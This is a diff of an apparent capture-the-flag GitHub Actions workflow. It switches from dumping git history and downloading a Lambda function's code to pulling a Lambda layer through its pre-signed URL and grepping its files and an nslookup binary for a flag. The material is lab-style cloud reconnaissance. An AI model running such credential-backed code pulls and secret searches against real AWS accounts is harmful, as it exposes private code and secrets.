@@ -21,26 +21,25 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          echo "=== 1. SEARCHING GIT HISTORY ==="
-          # This looks at every change ever made in the repository's history
-          # We'll search for the word 'flag', 'aws', or just dump the whole history
-          git log -p || echo "No git history found or not a git repo."
+          echo "=== 1. FETCHING LAYER DOWNLOAD LINK ==="
+          LAYER_URL=$(aws lambda get-layer-version \
+            --layer-name nslookup_layer \
+            --version-number 8 \
+            --query 'Content.Location' \
+            --output text)
           
-          echo "=== 2. DOWNLOADING LAMBDA CODE ==="
-          # Grab the pre-signed S3 URL directly (no jq needed, AWS CLI can filter it!)
-          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
+          echo "Downloading layer zip..."
+          curl -s "$LAYER_URL" -o layer.zip
           
-          echo "Downloading function zip..."
-          curl -s "$URL" -o function.zip
+          echo "Unzipping layer contents..."
+          unzip -o layer.zip -d layer_source
           
-          echo "Unzipping files..."
-          unzip -o function.zip -d lambda_source
+          echo "=== 2. LISTING ALL LAYER FILES ==="
+          ls -laR layer_source
           
-          echo "=== 3. LISTING EXTRACTED FILES ==="
-          ls -la lambda_source
-          
-          echo "=== 4. READING THE SOURCE CODE ==="
-          cat lambda_source/lambda_function.py
-          
-          echo "=== 5. HUNTING FOR FLAGS IN THE FOLDER ==="
-          grep -Ri "flag" lambda_source/ || echo "No obvious flags found in the files."
+          echo "=== 3. SEARCHING FOR TEXT FLAGS ==="
+          grep -Ri "flag" layer_source/ || echo "No plain text flag found in layer files."
+
+          echo "=== 4. SEARCHING BINARY STRINGS ==="
+          # If nslookup is a binary, search readable text inside it
+          strings layer_source/nslookup | grep -i "flag" || echo "No flag string in nslookup binary."
